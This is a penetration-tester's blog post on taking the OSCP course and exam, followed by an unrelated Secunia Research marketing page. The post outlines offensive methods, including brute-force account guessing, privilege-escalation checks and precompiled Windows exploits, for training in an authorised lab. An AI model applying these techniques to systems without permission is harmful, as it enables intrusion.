I would say there are really three components to the PWB course — the “scripted” course, the lab environment, and the exam. The course materials are fantastic – a 300+ page PDF Lab Guide with hours of accompanying videos. The idea is go to chapter by chapter watching the videos, reading the course guide and performing the related exercises. You’ll cover everything from service enumeration to buffer overflows, to password and Web Application attacks. You’ll learn some pretty cool file transfer, port redirection, and tunneling methods. You’ll be able to try your hand at almost all of the attacks in the lab with the exception of ARP spoofing for obvious reasons. If you want to see all of the topics covered in the course, check out the syllabus [here](http://www.offensive-security.com/documentation/penetration-testing-with-backtrack.pdf "Offsec PWB Syllabus").

You’ll also be given access to a Windows VM on which you can compile and test exploits before attempting them on the lab targets. In addition, you’re provided access to an online forum as well as IRC chat where you can usually find an Offsec admin online. I’ve read some course reviews by past students that used the forum/chat quite a bit and others not at all. I personally only used IRC once and that was when one of the machines was misconfigured and had to be fixed by an admin. Even though I didn’t use them a lot, I thought they were great resources to have available. Just don’t expect to get any answers or freebies.  From what I’ve read you might get a hint or more likely you might get the Offsec motto: “Try harder!”. Besides, it’s much more rewarding to figure out a really tough exploit on your own and it’s the best way to learn.

I’m glad I registered for 90 days of lab time.  As I went through each chapter, I found myself researching a lot of related topics and taking the time to test my own ideas.  It was nice not having to worry about running out of time.  There were some topics, such as Web Application attacks, that I was more comfortable with, so I spent considerably less time on these chapters. This afforded me even more time to research areas that I haven’t had as much exposure to, such as port redirection and tunneling. That’s the beauty of this course – it doesn’t spoon feed you everything or force you to spend equal amounts of time on each topic.  It presents the basics and encourages you to learn about each topic on your own. In many respects what you get out of the course is relative to how much effort you put in.  In all, I spend about 30 days on the scripted course material.

##### A word about course documentation…

You will be required to submit a final report at the completion of the course (following your exam). This lab report will ultimately contain your completed course exercises, your lab work and your exam results. I can’t stress enough the importance of documenting your progress as you go.  Offsec provides you with a report template but don’t put it off until the last minute!  I’ve read some PWB course reviews from students that have had reports in excess of 500 pages – mine was about 260.

If you don’t happen to perform penetration testing professionally, you’ll realize that Offsec is trying to impress upon you the importance of thorough and clear documentation.  Just remember that in addition to serving as proof of course completion, the assessment report should be able to walk the reader through the exploit and replicate it. Take notes, take screenshots and stay organized!  This is especially true for the lab and the exam.

### The Lab Environment

You are given access to about 50 disparate systems (varying OS’s, service packs/kernels, 3rd party software, etc), each with its own remote and local vulnerabilities waiting to be discovered. These systems span multiple networks, several of which are only accessible via exploitation and the various port redirection/tunneling techniques covered in the course. You should make an effort to access all networks, including Admin, and exploit as many systems as possible.

The course material introduces you to many of the enumeration and exploit methods you’ll need to exploit these systems and the lab is your chance to put that knowledge into practice (and continue to learn much more!).

Some systems you might exploit relatively easily while others (with names like Pain and Sufference) will put you to the test. My advice is to avoid Metasploit as much as possible. If you exploit a system with Metasploit, see if you can find the same exploit on exploit-db.com and try again. You’ll learn so much more and it will help you when it comes time for the exam.  Familiarize yourself with [Exploit Database](http://www.exploit-db.com/) and [SecurityFocus](http://www.securityfocus.com/) as they’ll be invaluable resources for finding relevant exploits.

I recommend reverting (rebooting) each lab system before you try to exploit it. Remember that you’re in a lab environment with other students making changes to the same systems. There were a couple of instances when I forgot to revert a system and thought I had discovered an exploit only to find out it was put there by someone else. There will be times when you’re working on a system and someone else reverts it. While it is frustrating, it’s a fairly rare occurrence because there are so many systems across multiple lab networks and you’re limited in the number of available reverts per day (so use them sparingly!).

Another piece of advice is to enumerate, enumerate and then enumerate some more! This goes for both pre- and post-exploit.  Once you’ve got root on a system, don’t just move to the next one. Remember, the lab is intended to mimic an organization’s network environment and you may find files or information on one system that will help you exploit others.

I’ve said it already, but make sure you keep good notes for each system you exploit — document open ports/services, networking data, OS/service packs, detail your exploits step-by-step and record any goodies you find (password hashes, etc). Be sure to take screenshots as you go. I kept all of this information organized within KeepNote and then transferred it to the formatted lab report periodically. I recommend updating your lab report after every couple of systems you exploit so you don’t end up with a massive reporting task at the end.

Different aspects of the lab will be challenging depending on your knowledge and experience.  For me, many of the web-based vulnerabilities came relatively easy but some of the Linux privilege escalation exploits were challenging (and that much more fun!).  I took the time to script the Linux privilege escalation enumeration step and learned a lot in the process (a bit more on that later).

During the lab time, I probably invested about 4-5 hours a day during the week and 6 hours a day on the weekends. In addition to a full time job and a wife in the last trimester of pregnancy I can tell you I had a lot on my plate. I’ll also say that it was well worth it. You can certainly get by with less time but again, I took the opportunity to learn everything I could about each topic and delve into other related topics along the way. By about day 75 I had gained access to all networks (including Admin) and got root/SYSTEM on 42 systems (including most of the tougher ones such as Pain, Ghost, and Niky) with limited shell access to several more. I still had a couple of weeks remaining in the lab but I decided to take that time to prepare for the exam.

### Exam Preparation

Exam prep really starts from day one of the course but I took the last two weeks of my lab time to pull everything together and thoroughly test my scripts and exploits.  Here’s some recommendations:

##### Script your enumeration

You’ll likely develop several custom scripts and use a variety of tools when enumerating in the lab.  I chose to tie all of these together into one comprehensive script that could be launched against one or many targets.  Here a basic overview of what my script did:

* TCP/UDP nmap scans to identify open ports/services for additional enumeration (see below)
* DNS enumeration (via dig)
* HTTP/S enumeration (via additional nmap scans and web file/directory brute forcing)
* MS-SQL enumeration (via nmap)
* SSH enumeration (account guessing via Hydra)
* SNMP enumeration (via nmap and onesixtyone)
* SMTP enumeration (via nmap and custom account guessing scripts)
* SMB enumeration (via samrdump)
* FTP enumeration (via nmap and hydra)

Of course you’re only limited by your imagination and scripting skills so I’m sure there are plenty of additional enumeration steps that you might think of automating. For me, the key was identifying the minimum tasks I wanted to perform while considering time and exam limitations (you won’t be able to use automated vulnerability scanners such as Nexpose, Nessus, etc). As a result I made sure to craft the script to only run the applicable enumeration scripts (based on running services) and omitted automated vulnerability tools.  Having a single script that orchestrates and formats the output for all of these various scans saved me a ton time. When it came time for my exam this proved especially useful because the exam guide gave specific instructions for one of the target systems and while I was working on that system I launched my enumeration script against the rest of the target IPs.  By the time I had gotten root on my first exam system, enumeration had completed for the rest.

Per request, I’m providing my enumeration scripts below.  Please note that these scripts come as-is with no promise of accuracy and no intent to update.

[Recon Scan](https://www.securitysift.com/download/recon_scan.zip "Download Recon Scan")

8.9 KiB

A collection of scripts to conduct recon/enumeration against remote services. These scripts were developed solely for personal use and were not written with efficiency or portability in mind. These scripts come as-is with no guarantee of functionality or support. Please only use them against targets for which you have expressed permission to scan!!! Check the readme.txt file for more information on use.

| **Author:** | Mike Czumak |
| --- | --- |
| **Platforms:** | Windows 8 |
| **License:** | Freeware |
MD5: 42a88f37503c12f637119a6eae663b16| **Date:** | November 23, 2013 |

##### Script your privilege escalation checks

Linux privilege escalation can be a complicated task as there are so many possible vectors. Running commands one-by-one is tedious and time-consuming, especially when you have to repeat it across many systems. Again, this was another prime opportunity to leverage the power of automation.

Here’s an overview of what my Linux privilege escalation script identified:

* Basic system info (OS/Kernel/System name, etc)
* Networking Info (ifconfig, route, netstat, etc)
* Miscellaneous filesystem info (mount, fstab, cron jobs, etc)
* User info (current user, all users, super users, command history, etc)
* File and Directory permissions (world-writeable files/dirs, suid files, root home directory)
* Files containing plaintext passwords
* Interesting files, processes and applications (all processes and packages, all processes run by root and the associated packages, sudo version, apache config file, etc)
* All installed languages and tools (gcc, perl, python, nmap, netcat, wget, ftp, etc)
* All relevant privilege escalation exploits (using a comprehensive dictionary of exploits with applicable kernel versions, software packages/processes, etc)

I wrote it in python and uploaded it to each Linux system I compromised to automate all of my enumeration actions and if necessary, privilege escalation exploit discovery.  Per request, I’ve included a copy of the script for download below. Note that this script come as-is with no promise of accuracy and no intent to update.

[Linuxprivchecker](https://www.securitysift.com/download/linuxprivchecker.py "Download Linuxprivchecker")

linuxprivchecker.py

Version: 1.0

24.7 KiB

132798 Downloads

Details

A basic linux privilege escalation enumeration script.

| **Author:** | Mike Czumak |
| --- | --- |
MD5: 501cb21d5399796535a352827db4e9bf| **Date:** | November 23, 2013 |

There are several other Linux and Windows privilege escalation scripts freely available and I did try a few, but writing my own allowed me to easily customize the checks I wanted to perform and taught me a great deal more. If you want to get some ideas for additional privilege escalation check out these resources:

* [Basic Linux Privilege Escalation (g0tmi1k)](http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation.html)
* [Windows Privilege Escalation – a cheatsheet (Tim Arneaud)](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
* [Linux/Unix privileges from a blackhats perspective](http://incolumitas.com/wp-content/uploads/2012/12/blackhats_view.pdf)
* [Automated Unix Privilege Escalation Check (pentestmonkey)](http://pentestmonkey.net/tools/audit/unix-privesc-check)
* [Automated Windows Privilege Escalation Check (pentestmonkey)](http://pentestmonkey.net/tools/windows-privesc-check)

##### Organize and pre-compile your exploits

I kept all of my exploits organized in a customized file structure on my Kali machine but taking the extra steps of pre-compiling and testing the Windows-based exploits really saved me time.  I made it a point to modify, compile, and test every remote and local Windows non-Metasploit exploit I could find.  I organized my compiled exploits and made a very basic chart with the exploit name, MSXX-XXXX number, Exploit-db number, and applicable Windows OS versions.

[![ExploitChart](http://www.securitysift.com/wp-content/uploads/2013/10/ExploitChart.bmp)](http://www.securitysift.com/wp-content/uploads/2013/10/ExploitChart.bmp)

During the exam if I came across a situation that required a remote or local Windows exploit, I could simply reference my chart and test the pre-compiled exploit.

Per request, I’ve uploaded an unformatted csv example below. Please note these only represent the exploits that I was able to compile and confirm. I make no guarantees regarding its accuracy or completeness.

[MS Privesc And Exploits Table](https://www.securitysift.com/download/MS_privesc_and_exploits_table.csv "Download MS Privesc And Exploits Table")

MS\_privesc\_and\_exploits\_table.csv

1.8 KiB

16095 Downloads

Details

Unformatted csv example of how I organized the working Microsoft exploits. These only represent the working exploits I compiled and confirmed, and is not an exhaustive list. I offer no guarantees as to its accuracy.

| **License:** | Freeware |
| --- | --- |
MD5:4119987a24174b1686b319e216e728b7| **Date:** | December 28, 2013 |

### The Exam

I registered for the exam about two weeks before my lab time ended. At your allotted exam start time (I chose 10 am on a Friday) you’ll receive the VPN connectivity pack and exam guide that provides instructions, identifies your target machines, and outlines any restrictions. As many other PWB review sites have stated, there are limitations on the use of Metasploit as well as automated vulnerability scanners such as Nexpose or Nessus so once again, don’t depend too heavily on these during your lab time! Don’t worry, you’ll get very specific instructions on what is and is not allowed when you receive your exam guide. You are allotted 24 hours for the exam, with an additional 24 hours to complete and submit your lab/exam report. Each of the target machines is assigned a point value and you need a minimum number of points to pass the exam. I’m not sure if these ever vary, but in my case I needed 70 out of 100 points to pass. In all, it took me 8 hours (with breaks) to accumulate enough points to pass the exam. I still had one more system that I had not exploited but I chose instead to finish and submit my report (which took about another 2 hours).  Though I was tempted to use the remaining 16 hours to get that last system, given that my wife was 9+ months pregnant, I wanted to avoid any scenario that involved me not finishing and submitting my report before she went into labor!  With the report submitted, I slept soundly that night and received confirmation of its receipt the following morning.  I received notification that I passed the exam and achieved the OSCP certification that Tuesday.

As far as recommendations for the exam, remember to get plenty of rest the night before and take frequent breaks. I took one after every system I completed with a longer dinner break once I had accumulated enough points and before I completed my report. Try and focus on one system at a time but don’t get bogged down. If you get really stuck, move on to another system. Again, organizing my notes/scripts, automating the enumeration and pre-compiling the Windows exploits allowed me to really focus on relevant exploits without wasting too much time.

### Conclusion

This was the most fun and challenging course I’ve ever taken.  It’s also the most satisfying because although the course material is excellent, much of what you accomplish is due to your own hard work and commitment to Try Harder! I learned a lot and I can’t recommend it enough for anyone that wants to wants to get access to a quality lab environment and hone their pen-testing skills. Since exploit development is one of my areas of interest, I definitely plan on taking the Cracking the Perimeter course as well as the Advanced Web Attacks course (once it’s offered online).

[Follow @SecuritySift](http://twitter.com/securitysift)

### Share this:

* [Twitter](https://www.securitysift.com/offsec-pwb-oscp/?share=twitter "Click to share on Twitter")
* [Facebook](https://www.securitysift.com/offsec-pwb-oscp/?share=facebook "Click to share on Facebook")
* [LinkedIn](https://www.securitysift.com/offsec-pwb-oscp/?share=linkedin "Click to share on LinkedIn")
* Email
* [Pinterest](https://www.securitysift.com/offsec-pwb-oscp/?share=pinterest "Click to share on Pinterest")
* [Reddit](https://www.securitysift.com/offsec-pwb-oscp/?share=reddit "Click to share on Reddit")

In category: [Training/Certifications](https://www.securitysift.com/category/trainingcertifications/)
Tags:[Backtrack](https://www.securitysift.com/tag/backtrack/) , [class](https://www.securitysift.com/tag/class/) , [course](https://www.securitysift.com/tag/course/) , [enumeration](https://www.securitysift.com/tag/enumeration/) , [Kali](https://www.securitysift.com/tag/kali/) , [Offensive Security](https://www.securitysift.com/tag/offensive-security/) , [Offsec](https://www.securitysift.com/tag/offsec/) , [OSCP](https://www.securitysift.com/tag/oscp/) , [pen testing](https://www.securitysift.com/tag/pen-testing/) , [penetration testing](https://www.securitysift.com/tag/penetration-testing/) , [pentest](https://www.securitysift.com/tag/pentest/) , [privilege escalation](https://www.securitysift.com/tag/privilege-escalation/) , [PWB](https://www.securitysift.com/tag/pwb/)

### 283 Comments [add one](#leave-comment)

Previous post: [Who do you trust? Cross-domain content extraction with Clickjacking](https://www.securitysift.com/who-do-you-trust-cross-domain-content-extraction-with-clickjacking/)

Next post: [Windows Exploit Development – Part 1: The Basics](https://www.securitysift.com/windows-exploit-development-part-1-basics/)

Connect with me...
[![]( https://www.securitysift.com/wp-content/themes/news-leak/images/rss.png)](http://www.securitysift.com/?feed=rss) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/in.png)](www.linkedin.com/in/michaelczumak%20) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/tweeter.png)](https://twitter.com/SecuritySift) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/face.png)](https://www.facebook.com/secsift)

* Most Popular Posts
* Random Posts

* [Offensive Security’s PWB and OSCP — My Experience](https://www.securitysift.com/offsec-pwb-oscp/ "Offensive Security’s PWB and OSCP — My Experience")October 9, 2013
* [Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/ "Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)")November 29, 2014
* [Windows Exploit Development – Part 2: Intro to Stack Based Overflows](https://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/ "Windows Exploit Development – Part 2: Intro to Stack Based Overflows")December 13, 2013
* [peCloak.py – An Experiment in AV Evasion](https://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/ "peCloak.py – An Experiment in AV Evasion")March 9, 2015
* [Phishing with Macros and Powershell](https://www.securitysift.com/phishing-with-macros-and-powershell/ "Phishing with Macros and Powershell")May 22, 2015

* [Windows Exploit Development – Part 1: The Basics](https://www.securitysift.com/windows-exploit-development-part-1-basics/)December 6, 2013
* [11 Fallacies of Web Application Security](https://www.securitysift.com/11-fallacies-of-web-application-security/)May 13, 2013
* [Cross Origin Request Forgery Pt 2 – Exploiting Browser Security](https://www.securitysift.com/cross-origin-request-forgery-pt-2-exploiting-browser-security/)October 21, 2012
* [Phishing with Macros and Powershell](https://www.securitysift.com/phishing-with-macros-and-powershell/)May 22, 2015
* [The Search For Shellshock](https://www.securitysift.com/the-search-for-shellshock/)September 28, 2014

### Categories

* [Breaches](https://www.securitysift.com/category/breaches/)
* [Exploits](https://www.securitysift.com/category/exploits/)
* [Opinion](https://www.securitysift.com/category/opinion/)
* [Pentesting](https://www.securitysift.com/category/pentesting/)
* [Puzzles](https://www.securitysift.com/category/puzzles/)
* [Training/Certifications](https://www.securitysift.com/category/trainingcertifications/)
* [Uncategorized](https://www.securitysift.com/category/uncategorized/)
* [Web Security](https://www.securitysift.com/category/web-security/)

### Archives

* [October 2017](https://www.securitysift.com/2017/10/)
* [September 2017](https://www.securitysift.com/2017/09/)
* [May 2015](https://www.securitysift.com/2015/05/)
* [April 2015](https://www.securitysift.com/2015/04/)
* [March 2015](https://www.securitysift.com/2015/03/)
* [February 2015](https://www.securitysift.com/2015/02/)
* [December 2014](https://www.securitysift.com/2014/12/)
* [November 2014](https://www.securitysift.com/2014/11/)
* [October 2014](https://www.securitysift.com/2014/10/)
* [September 2014](https://www.securitysift.com/2014/09/)
* [July 2014](https://www.securitysift.com/2014/07/)
* [May 2014](https://www.securitysift.com/2014/05/)

### Pages

* [About](https://www.securitysift.com/about/)
* [My Library](https://www.securitysift.com/my-library/)
### Follow me on Twitter

[My Tweets](https://twitter.com/422832532212559872)

The views and and opinions expressed in this blog are my own and do not represent those of my previous or current employer. © Copyright 2025 Security Sift. All Rights Reserved,
[News Leak theme by Archy Studio](http://www.archystudio.com/website-design/)

---



=== Content from secunia.com_7f264307_20250124_115546.html ===


[Skip to main content](#main-content)
[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

Search

## Main navigation

* Solutions
  + Column 1
    - Business challenge
      * [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
      * [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
      * [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
      * [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
      * [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
      * [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
      * [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
      * [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
      * [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
      * [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
      * [Public sector](https://www.flexera.com/solutions/public-sector)
  + Column 2
    - Spend management by vendor
      * [IBM](https://www.flexera.com/solutions/vendor/ibm)
      * [Oracle](https://www.flexera.com/solutions/vendor/oracle)
      * [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
      * [SAP](https://www.flexera.com/solutions/vendor/sap)
      * [VMware](https://www.flexera.com/solutions/vendor/vmware)
      * [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
      * [AWS](https://www.flexera.com/solutions/vendor/aws)
      * [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
      * [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
      * [Adobe](https://www.flexera.com/solutions/vendor/adobe)

  ### Achieve more through a united FinOps and ITAM function

  The future is hybrid. Break down the walls between ITAM and FinOps to drive more revenue, more customer growth and more innovation.

  [Discover More](https://www.flexera.com/resources/hybrid-itam-finops)
* Products
  + Column 1
    - [Flexera One](https://www.flexera.com/products/flexera-one)
      * [IT Visibility](https://www.flexera.com/products/flexera-one/it-visibility)
      * [ITAM](https://www.flexera.com/products/flexera-one/it-asset-management)
      * [SaaS Management](https://www.flexera.com/products/flexera-one/saas-management)
      * [FinOps](https://www.flexera.com/products/flexera-one/finops)
      * [Technology Intelligence Platform](https://www.flexera.com/products/flexera-one/technology-intelligence-platform)
  + Column 2
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
      * [Snow Spend Optimizer](https://www.flexera.com/products/snow-atlas/snow-spend-optimizer)
      * [Snow SaaS Management](https://www.flexera.com/products/snow-atlas/snow-saas-management)
  + Column 3
    - Hide group
      * [Security](https://www.flexera.com/products/security)
      * [Application Readiness](https://www.flexera.com/products/adminstudio)
      * [All products](https://www.flexera.com/products)
      * [All Snow products](https://www.flexera.com/products/snow)
      * [Integrations](https://www.flexera.com/products/integrations)

  ### Flexera 2024 State of the Cloud Report

  What do transformative initiatives such as GenAI, machine learning and sustainability mean for the cloud? Check out the 2024 State of the Cloud Report to find the answer as well as all the latest cloud computing trends.

  [View Report](https://info.flexera.com/CM-REPORT-State-of-the-Cloud)
* Success
  + Column 1
    - [Customer success](https://www.flexera.com/customer-success)
      * Support
        + [Flexera support portal](https://community.flexera.com/s/support-hub)
        + [Flexera product documentation](https://docs.flexera.com)
        + [Snow product documentation](https://docs.snowsoftware.io/)
      * Services and training
        + [Services](https://www.flexera.com/customer-success/services)
        + [Training](https://www.flexera.com/customer-success/training)
  + Column 2
    - Hide group
      * [Technology Intelligence Awards](https://www.flexera.com/customer-success/awards)
      * [Flexera community](https://community.flexera.com/s/)

  ### Insights from Gartner®

  Find a curated series of actionable and objective insights for IT executives and their teams. Get expert insights from valued analysts, courtesy of Flexera.

  [Discover More](https://www.flexera.com/resources/gartner-analyst-research)
* Resources
  + Column 1
    - [Resources](https://www.flexera.com/resources)
      * [Webinars](https://www.flexera.com/resources?type%5Bwebinar%5D=webinar)
      * [Videos](https://www.flexera.com/resources?type%5Bvideo%5D=video)
      * [Datasheets](https://www.flexera.com/resources?type%5Bdatasheet%5D=datasheet)
      * [White papers & reports](https://www.flexera.com/resources?type%5Bwhite-paper-industry-report%5D=white-paper-industry-report)
  + Column 2
    - Hide group
      * [Blog](/blog/)
      * [Case studies](https://www.flexera.com/resources/case-studies)
      * [Events](https://www.flexera.com/resources?type%5Bevent%5D=event)
      * [Analyst Research](https://www.flexera.com/resources/gartner-analyst-research)
      * [Glossary](https://www.flexera.com/resources/glossary)
      * [Demos & trials](https://www.flexera.com/resources?type%5Bdemo-trials%5D=demo-trials)
      * [Business value calculator](https://www.flexera.com/resources/business-value-calculator)

  ### Flexera 2025 IT Priorities Report

  Insights from Flexera’s 2025 IT Priorities Report highlight what’s top of mind for IT decision makers in the year ahead. Discover the challenges, priorities and opportunities that will shape the future IT landscape.

  [View Report](https://info.flexera.com/ITV-REPORT-IT-Priorities)
* About
  + Column 1
    - [Company](https://www.flexera.com/about-us)
      * [About](https://www.flexera.com/about-us)
      * [Careers](https://www.flexera.com/about-us/careers)
      * [Contact](https://www.flexera.com/about-us/contact-us)
      * [Leadership](https://www.flexera.com/about-us/leadership)
    - [Partners](https://www.flexera.com/about-us/partners)
      * [Partner program](https://www.flexera.com/about-us/partners/partner-program)
      * [Partner directory](https://www.flexera.com/about-us/partners/directory)
  + Column 2
    - [Press center](https://www.flexera.com/about-us/press-center)
      * [Press releases](https://www.flexera.com/about-us/all-press-releases)
      * [Awards](https://www.flexera.com/about-us/press-center#awards)
      * [Articles](https://www.flexera.com/about-us/all-articles)
    - Hide group
      * Social responsibility
        + [ESG](https://www.flexera.com/about-us/environmental-social-governance)
        + [Diversity](https://www.flexera.com/about-us/diversity)

  ### More value with technology intelligence

  The unparalleled synergy of Flexera and Snow provides the Technology Intelligence you need for more efficiency, insight and governance than ever before.

  [Discover More](https://www.flexera.com/more-value-with-technology-intelligence)

Search

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

## External Links

* External Links
  + [Community](https://community.flexera.com/)
  + [Product Access](https://app.flexera.com/login)
  + [Partner Portal](https://flexera.channeltivity.com/Login)

[Book a demo](/about-us/contact-us?C_Interest1=sales)

# Secunia Research

## The world’s best vulnerability intelligence

The Secunia Research team from Flexera provides the most accurate and reliable source of vulnerability intelligence.

[Contact Us](https://www.flexera.com/about-us/contact-us?C_Interest1=sales&C_SolutionInterest=SVM)
Watch video (0:29)

Related links

* [Anatomy of a security advisory](https://www.flexera.com/resources/infographics/anatomy-of-a-security-advisory)
* [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)
* [Software Vulnerability Manager](/products/software-vulnerability-manager)
* [Security advisories from Secunia Research](https://www.flexera.com/products/security/software-vulnerability-advisories)
* [Report a vulnerability](https://www.flexera.com/about-us/contact-us/report-vulnerability)

 ![Secunia Research](/sites/default/files/2022-04/hero-secunia-research-bg.jpg)

Featured Details

## Multiple ways to consume Secunia Research

Secunia delivers software security research that provides reliable, curated and actionable vulnerability intelligence. Organizations can expect to receive standardized, validated and enriched vulnerability research on a specific version of a software product. Secunia Research supports four solutions:

![Software Vulnerability Research](/sites/default/files/2022-04/icon-secunia-research-svr.svg)

### [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)

Software Vulnerability Research utilizes Secunia Research to drive awareness of vulnerabilities matching your specified criteria

[Learn More](https://www.flexera.com/products/software-vulnerability-research)

![Software Vulnerability Manager](/sites/default/files/2022-04/icon-secunia-research-svm.svg)

### [Software Vulnerability Manager](/products/software-vulnerability-manager)

Software Vulnerability Manager uses Secunia Research data to identify, prioritize and patch known vulnerable software detected in your environment

[Learn More](/products/software-vulnerability-manager)

![Data Platform](/sites/default/files/2022-04/icon-secunia-research-dp.svg)

### [Data Platform](https://www.flexera.com/products/data-platform)

Data Platform leverages Secunia Research to provide high-level insights based on major or minor versions of software in your normalized inventory

[Learn More](https://www.flexera.com/products/data-platform)

![Flexera One](/sites/default/files/2022-04/icon-secunia-research-flexera-one.svg)

### [Flexera One](/flexera-one)

Flexera One utilizes Secunia Research (alongside public NVD data) to provide more granular matching of build-level versions of software in your normalized inventory within its IT Asset Management and IT Visibility solutions

[Learn More](/flexera-one)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Informing IT, Transforming IT

## Industry insights to help keep you informed

[#### Webinar

### Stay Ahead of Cyber Threats: Flexera's Latest Vulnerability Insights

Join us for this session where we'll explore the latest findings from the Flexera Monthly Vulnerability Insights Report.](https://info.flexera.com/SVM-WBNR-Vulnerability-Insights-Roundtable)

[#### Webinar

### Dive deeper into the Flexera Annual Vulnerability Insights

We'll explore the key findings from the Flexera Annual Vulnerability Insights Report. Learn about the latest cybersecurity trends, the most targeted industries, the types of vulnerabilities, plus management and mitigation strategies.](https://info.flexera.com/SVM-WBNR-Flexera-Annual-Vulnerability-Insights?lead_source=Website%20Visitor&id=Flexera.com-Resources)

#### Video

### Close the Risk Window with Software Vulnerability Manager

Stop reacting. Gain control. Stay secure. Build a more effective risk mitigation process leveraging Secunia Research vulnerability intelligence and the largest repository of third-party patch data in the industry.

Remote video URL

[#### Trial

### Software Vulnerability Manager Assessment free trial

Get access to the complete set of modules of Software Vulnerability Manager: Research, Assessment and Patching](https://info.flexera.com/SVM-EVAL-Software-Vulnerability-Manager)

[#### Datasheet

### Protect your ServiceNow® investment with the highest quality data

IT Visibility offers certified ServiceNow integrations that accelerate platform expansion, improve ROI and increase efficiencies across ITIL processes by delivering clean software and hardware asset data directly.](/sites/default/files/datasheet-itv-maximize-servicenow-investment.pdf)

[#### Blog

### Avoid missing crucial vulnerability intelligence amid NVD backlog

Recent developments regarding the National Vulnerability Database (NVD) have some technology leaders on edge. Since February, the U.S. National Institute of Standards and Technology (NIST) has almost completely stopped enriching software vulnerabi...](https://www.flexera.com/blog/vulnerability-management/avoid-missing-crucial-vulnerability-intelligence-amid-nvd-backlog/)

[View all resources](https://www.flexera.com/resources?category%5Bsoftware-vulnerability-management%5D=software-vulnerability-management)

## Footer Menu

* Column
  + Business challenge
    - [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
    - [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
    - [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
    - [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
    - [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
    - [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
    - [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
    - [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
    - [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
    - [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
    - [Public sector](https://www.flexera.com/solutions/public-sector)
* Column
  + Spend management by vendor
    - [IBM](https://www.flexera.com/solutions/vendor/ibm)
    - [Oracle](https://www.flexera.com/solutions/vendor/oracle)
    - [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
    - [SAP](https://www.flexera.com/solutions/vendor/sap)
    - [VMware](https://www.flexera.com/solutions/vendor/vmware)
    - [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
    - [AWS](https://www.flexera.com/solutions/vendor/aws)
    - [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
    - [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
    - [Adobe](https://www.flexera.com/solutions/vendor/adobe)
* Column
  + Products
    - [Flexera One](https://www.flexera.com/products/flexera-one)
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
    - [Security](https://www.flexera.com/products/security)
    - [Application Readiness](https://www.flexera.com/products/adminstudio)
    - [All products](https://www.flexera.com/products)
    - [All Snow products](https://www.flexera.com/products/snow)
    - [Integrations](https://www.flexera.com/products/integrations)
* Column
  + Company
    - [About](https://www.flexera.com/about-us)
    - [Careers](https://www.flexera.com/about-us/careers)
    - [Leadership](https://www.flexera.com/about-us/leadership)
